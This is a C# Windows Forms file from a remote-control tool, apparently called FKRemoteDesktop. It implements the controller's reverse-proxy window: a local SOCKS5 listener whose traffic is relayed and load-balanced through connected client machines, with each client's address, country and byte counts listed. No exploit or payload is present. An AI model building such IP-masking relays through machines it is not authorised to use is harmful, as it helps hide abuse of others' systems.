using FKRemoteDesktop.Configs;
using FKRemoteDesktop.Helpers;
using FKRemoteDesktop.Message;
using FKRemoteDesktop.Message.SubMessageHandler;
using FKRemoteDesktop.Network;
using FKRemoteDesktop.ReverseProxy;
using System.Net.Sockets;
using System;
using System.Windows.Forms;
using System.Globalization;
using FKRemoteDesktop.Enums;
//--------------------------------------------------------------------------------------
namespace FKRemoteDesktop.Forms
{
    public partial class ReverseProxyForm : Form
    {
        private readonly Client[] _clients;
        private readonly ReverseProxyHandler _reverseProxyHandler;
        private ReverseProxyClient[] _openConnections;

        public ReverseProxyForm(Client[] clients)
        {
            this._clients = clients;
            this._reverseProxyHandler = new ReverseProxyHandler(clients);

            RegisterMessageHandler();
            InitializeComponent();
        }

        private void RegisterMessageHandler()
        {
            _reverseProxyHandler.ProgressChanged += ConnectionChanged;
            MessageHandler.Register(_reverseProxyHandler);
        }

        private void UnregisterMessageHandler()
        {
            MessageHandler.Unregister(_reverseProxyHandler);
            _reverseProxyHandler.ProgressChanged -= ConnectionChanged;
        }

        private void ClientDisconnected(Client client, bool connected)
        {
            if (!connected)
            {
                this.Invoke((MethodInvoker)this.Close);
            }
        }

        private void AddInfoText(string s)
        {
            rtbLog.Text += s;
            rtbLog.Text += Environment.NewLine;
        }

        private void ReverseProxyForm_Load(object sender, System.EventArgs e)
        {
            if (_clients.Length > 1)
            {
                this.Text = "FK远控服务器端 - 反向代理窗口 [负载均衡器已开启]";
                string text = "负载均衡器已开启, " + _clients.Length + " 个客户端将用作代理\r\n可以尝试刷新 www.ipchicken.com 查看自己的IP是否发生变化。如果发生了变化，则表示负载均衡器有效。";
                AddInfoText(text);
            }
            else if (_clients.Length == 1)
            {
                this.Text = WindowHelper.GetWindowTitle("FK远控服务器端 - 反向代理窗口", _clients[0]);
                string text = "仅启用 1 个客户端，负载均衡器未开启，选择多个客户端可激活负载均衡器";
                AddInfoText(text);
            }
            nudServerPort.Value = ServerConfig.ReverseProxyPort;
        }

        private void ReverseProxyForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            ServerConfig.ReverseProxyPort = GetPortSafe();
            UnregisterMessageHandler();
            _reverseProxyHandler.Dispose();
        }

        private void ConnectionChanged(object sender, ReverseProxyClient[] proxyClients)
        {
            lock (_reverseProxyHandler)
            {
                lstConnections.BeginUpdate();
                _openConnections = proxyClients;
                lstConnections.VirtualListSize = _openConnections.Length;
                lstConnections.EndUpdate();
            }
        }

        private ushort GetPortSafe()
        {
            var portValue = nudServerPort.Value.ToString(CultureInfo.InvariantCulture);
            return (!ushort.TryParse(portValue, out ushort port)) ? (ushort)0 : port;
        }

        private void ToggleConfigurationButtons(bool started)
        {
            btnStart.Enabled = !started;
            nudServerPort.Enabled = !started;
            btnStop.Enabled = started;
        }

        // 开启监听
        private void btnStart_Click(object sender, System.EventArgs e)
        {
            try
            {
                ushort port = GetPortSafe();
                if (port == 0)
                {
                    MessageBox.Show("请输入一个有效端口 > 0.", "请输入一个有效端口", MessageBoxButtons.OK,
                        MessageBoxIcon.Warning);
                    return;
                }
                _reverseProxyHandler.StartReverseProxyServer(port);
                ToggleConfigurationButtons(true);
            }
            catch (SocketException ex)
            {
                if (ex.ErrorCode == 10048)
                {
                    MessageBox.Show("该端口已被占用.", "监听失败", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                else
                {
                    MessageBox.Show($"监听异常: {ex.Message}\n\n错误码: {ex.ErrorCode}",
                        "监听异常", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"监听异常: {ex.Message}", "监听异常", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        // 停止监听
        private void btnStop_Click(object sender, EventArgs e)
        {
            ToggleConfigurationButtons(false);
            _reverseProxyHandler.StopReverseProxyServer();
        }

        // 更变端口值
        private void nudServerPort_ValueChanged(object sender, EventArgs e)
        {
            string text = string.Format("连接 SOCKS5 代理: 127.0.0.1:{0} (无账号密码模式)", nudServerPort.Value);
            AddInfoText(text);
        }

        private void lstConnections_RetrieveVirtualItem(object sender, RetrieveVirtualItemEventArgs e)
        {
            lock (_reverseProxyHandler)
            {
                if (e.ItemIndex < _openConnections.Length)
                {
                    ReverseProxyClient connection = _openConnections[e.ItemIndex];

                    e.Item = new ListViewItem(new string[]
                    {
                        connection.Client.EndPoint.ToString(),
                        connection.Client.UserInfo.Country,
                        (connection.HostName.Length > 0 && connection.HostName != connection.TargetServer) ? string.Format("{0}  ({1})", connection.HostName, connection.TargetServer) : connection.TargetServer,
                        connection.TargetPort.ToString(),
                        StringHelper.GetHumanReadableFileSize(connection.LengthReceived),
                        StringHelper.GetHumanReadableFileSize(connection.LengthSent),
                        ToString(connection.Type)
                    })
                    { Tag = connection };
                }
            }
        }

        private string ToString(EProxyType type)
        {
            switch (type)
            {
                case EProxyType.eProxyType_Unknown: return "未知代理";
                case EProxyType.eProxyType_SOCKS5: return "SOCK5代理";
                case EProxyType.eProxyType_HTTPS: return "HTTPS代理";
                default: return "未知代理";
            }
        }

        // 断开连接
        private void killConnectionToolStripMenuItem_Click(object sender, EventArgs e)
        {
            lock (_reverseProxyHandler)
            {
                if (lstConnections.SelectedIndices.Count > 0)
                {
                    int[] items = new int[lstConnections.SelectedIndices.Count];
                    lstConnections.SelectedIndices.CopyTo(items, 0);
                    foreach (int index in items)
                    {
                        if (index < _openConnections.Length)
                        {
                            ReverseProxyClient connection = _openConnections[index];
                            connection?.Disconnect();
                        }
                    }
                }
            }
        }
    }
}
